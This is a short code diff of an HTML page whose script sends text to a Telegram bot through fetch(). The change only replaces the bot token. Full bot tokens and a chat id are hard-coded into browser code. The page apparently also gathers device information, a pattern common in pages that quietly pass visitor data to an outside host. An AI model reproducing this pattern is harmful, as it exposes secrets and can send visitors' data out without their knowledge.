@@ -54,7 +54,7 @@
 
   <script>
     function sendToTelegram(text) {
-      const URL = `https://api.telegram.org/bot7837570045:AAHzWk-oVbQ14szhZu0NlGVof68E-DzBfQ8/sendMessage?chat_id=-1002993722537&text=${encodeURIComponent(text)}`;
+      const URL = `https://api.telegram.org/bot7837570045:AAGTb4EZ9DnMBTglhyso5fckPLPq1FIm4Qs/sendMessage?chat_id=-1002993722537&text=${encodeURIComponent(text)}`;
       fetch(URL)
           .then(response => response.json())
           .then(data => console.log("Отправлено:", data))
@@ -195,3 +195,4 @@ console.log(getDeviceInfo());
 
 
 </html>
+
